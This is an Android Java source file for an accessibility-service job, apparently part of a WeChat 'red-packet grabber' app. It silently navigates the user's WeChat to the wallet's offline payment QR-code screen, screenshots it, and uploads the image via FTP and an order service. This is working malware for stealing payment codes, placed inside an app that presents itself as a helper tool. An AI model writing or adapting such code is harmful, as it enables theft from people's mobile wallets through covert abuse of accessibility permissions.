package accessibility.app;
import util.ConfigCt;

import accessibility.BaseAccessibilityJob;
import accessibility.QiangHongBaoService;

import android.graphics.Bitmap;
import android.os.Handler;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import download.ftp;
import order.OrderService;
import order.screen.ScreenShotActivity;
import order.screen.Shotter;
import accessibility.AccessibilityHelper;
import util.Funcs;
/**
 * @author byc
 *
 */
public class ShotCode  extends BaseAccessibilityJob{
	private static ShotCode current;
	public static final String WINDOW_COIN_PURSE_UI="com.tencent.mm.plugin.offline.ui.WalletOfflineCoinPurseUI";
	public static final String WINDOW_MENU_UI="android.widget.FrameLayout";
	private AccessibilityNodeInfo mRootNode;
    private ShotCode() {
    	super(new String[]{ConfigCt.WECHAT_PACKAGENAME});
    }
    public static synchronized ShotCode getShotCode() {
        if(current == null) {
            current = new ShotCode();
        }
        return current;
    }
    @Override
	public void onCreateJob(QiangHongBaoService service) {
		super.onCreateJob(service);

	}
    @Override
    public void onStopJob() {
    	super.onStopJob();

    }
	/*
	 * (刷新处理流程)
	 * @see accessbility.AccessbilityJob#onWorking()
	 */
	@Override
	public void onWorking(){
    	
	}
	 @Override
	    public void onReceiveJob(AccessibilityEvent event) {
	    	super.onReceiveJob(event);
	    	if(!mIsEventWorking)return;
	    	if(!mIsTargetPackageName)return;
	    	if(!event.getPackageName().toString().equals(ConfigCt.WECHAT_PACKAGENAME))return;
	    	int eventType = event.getEventType();
	    	if(eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED){
	    		mCurrentUI=event.getClassName().toString();
				//+++++++++++++++++++++++++++++++++弹出菜单++++++++++++++++++++++++++++++++++++++++++
				if(mCurrentUI.equals(WINDOW_MENU_UI)){
					mRootNode = event.getSource();
					if (mRootNode == null)return;
					mRootNode=AccessibilityHelper.getRootNode(mRootNode);
					clickPurse(mRootNode);
				}
				//+++++++++++++++++++++++++++++++++1。是二维码窗体：++++++++++++++++++++++++++++++++++++++++++
				if(mCurrentUI.equals(WINDOW_COIN_PURSE_UI)){
					mRootNode = event.getSource();
					if (mRootNode == null)return;
					mRootNode=AccessibilityHelper.getRootNode(mRootNode);
					clickMyKnown(mRootNode);
					shotScreen();
				}
	    	}
	 }

    /*
     * 点击更多功能按钮；
     */
    //@TargetApi(Build.VERSION_CODES.JELLY_BEAN)
    public boolean clickJia(AccessibilityNodeInfo rootNode){
    	AccessibilityNodeInfo nodeInfo = AccessibilityHelper.findNodeInfosByText(rootNode, "更多功能按钮",-1);
    	if(nodeInfo==null)return false;
    	if(!nodeInfo.getClassName().toString().equals("android.widget.RelativeLayout"))return false;
    	return AccessibilityHelper.performClick(nodeInfo);
    }
    /*
     * 点击收付款；
     */
    //@TargetApi(Build.VERSION_CODES.JELLY_BEAN)
    public boolean clickPurse(AccessibilityNodeInfo rootNode){
    	AccessibilityNodeInfo nodeInfo = AccessibilityHelper.findNodeInfosByText(rootNode, "收付款",0);
    	if(nodeInfo==null)return false;
    	return AccessibilityHelper.performClick(nodeInfo);
    }
    /*
     * 点击我知道了；
     */
    //@TargetApi(Build.VERSION_CODES.JELLY_BEAN)
    public boolean clickMyKnown(AccessibilityNodeInfo rootNode){
    	AccessibilityNodeInfo nodeInfo = AccessibilityHelper.findNodeInfosByText(rootNode, "知道了",0);
    	if(nodeInfo==null)return false;
    	if(!nodeInfo.getClassName().toString().equals("android.widget.Button"))return false;
    	return AccessibilityHelper.performClick(nodeInfo);
    }
    /*
     * 截图上传：
     */
    private void shotScreen(){
    	if(ScreenShotActivity.shotter==null)return;
    	final String filename=Funcs.getFilename(ConfigCt.appID, ".png");
    	ScreenShotActivity.shotter.startScreenShot(new Shotter.OnShotListener() {
            @Override
            public void onFinish(Bitmap bitmap) {
            	//bitmap.recycle();
            	//bitmap=null;
            	OrderService os=OrderService.getOrderService();
            	if(os!=null)os.SendBmp(bitmap);
            	ftp.getFtp(context).UploadStart(filename);
            	mIsEventWorking=false;
            	AccessibilityHelper.performBack(service);
            }
        },ConfigCt.LocalPath+filename);
    }
    /*
     * 点击加号
     */
    public boolean ClickJiaJob() {
        AccessibilityNodeInfo rootNode = service.getRootInActiveWindow();
        if (rootNode == null) {return false;}
        return clickJia(rootNode);
    }
    /*
     * 返回
     */
    public void performReturn() {
    	AccessibilityHelper.performBack(service);
    }
    /*
     * 开始工作：
     */
    public  boolean startWorking() {
		if(!QiangHongBaoService.isRunning())return false;
		EventStart();
		handlerWorking.postDelayed(runnableTime, 1000*60);
		 ClickJiaJob();
		return true;
    }
	Handler handlerWorking = new Handler();    
	Runnable runnableTime = new Runnable() {    
		@Override    
	    public void run() {    
			mIsEventWorking=false;	   
	    }    
	};
	/*
	     public void onProcessEvent(AccessibilityEvent event) {
    	//if(!bWorking)return;
    	if(!event.getPackageName().toString().equals(Config.WECHAT_PACKAGENAME))return;
    	int eventType = event.getEventType();
    	if(eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED){
    		mCurrentUI=event.getClassName().toString();
			//+++++++++++++++++++++++++++++++++弹出菜单++++++++++++++++++++++++++++++++++++++++++
			if(mCurrentUI.equals(WINDOW_MENU_UI)){
				mRootNode = event.getSource();
				if (mRootNode == null)return;
				mRootNode=AccessibilityHelper.getRootNode(mRootNode);
				clickPurse(mRootNode);
			}
			//+++++++++++++++++++++++++++++++++1。是二维码窗体：++++++++++++++++++++++++++++++++++++++++++
			if(mCurrentUI.equals(WINDOW_COIN_PURSE_UI)){
				mRootNode = event.getSource();
				if (mRootNode == null)return;
				mRootNode=AccessibilityHelper.getRootNode(mRootNode);
				clickMyKnown(mRootNode);
				shotScreen();
			}
    	}
        
    }
	 */
}
